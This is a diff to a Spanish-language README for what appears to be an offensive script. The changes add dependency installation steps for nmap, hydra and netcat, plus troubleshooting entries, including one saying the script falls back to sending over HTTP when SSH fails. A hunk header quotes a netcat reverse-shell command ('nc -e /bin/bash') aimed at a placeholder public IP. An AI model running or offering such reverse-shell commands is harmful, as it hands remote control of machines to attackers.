@@ -261,12 +261,41 @@ http://192.168.1.104:8080/script
 ## 🚀 ¿CÓMO USAR EL SCRIPT?
 
 ### **PASO 1: Preparación** ⚙️
-```bash
-# Instalar dependencias
-sudo apt install nmap hydra netcat openssh-client smbclient openssl openvpn nginx
 
-# Instalar Python
+#### **Linux/Kali (Automático):**
+```bash
+# Ejecutar script de instalación automática
+chmod +x install_dependencies.sh
+./install_dependencies.sh
+```
+
+#### **Linux/Kali (Manual):**
+```bash
+# Instalar dependencias del sistema
+sudo apt install nmap hydra netcat-openbsd openssh-client smbclient openssl openvpn nginx ffmpeg
+
+# Instalar dependencias de Python
+pip3 install -r requirements.txt
+```
+
+#### **Windows:**
+```cmd
+# Ejecutar script de instalación
+install_dependencies.bat
+
+# O manualmente:
 pip install -r requirements.txt
+```
+
+#### **Verificar Instalación:**
+```bash
+# Verificar que paramiko esté instalado
+python3 -c "import paramiko; print('✅ Paramiko OK')"
+
+# Verificar herramientas del sistema
+nmap --version
+hydra -h
+nc -h
 ```
 
 ### **PASO 2: Configuración** 🔧
@@ -385,6 +414,19 @@ nc -e /bin/bash TU_IP_PUBLICA 4444
 
 ### **Problema**: No hay acceso remoto
 **Solución**: Verifica que la IP pública esté configurada correctamente
+
+### **Problema**: Error "no module llamado paramiko"
+**Solución**: 
+```bash
+# Instalar paramiko
+pip3 install paramiko
+
+# O ejecutar script de instalación
+./install_dependencies.sh
+```
+
+### **Problema**: Error de conexión SSH
+**Solución**: El script intentará envío por HTTP como alternativa
 
 ---
 
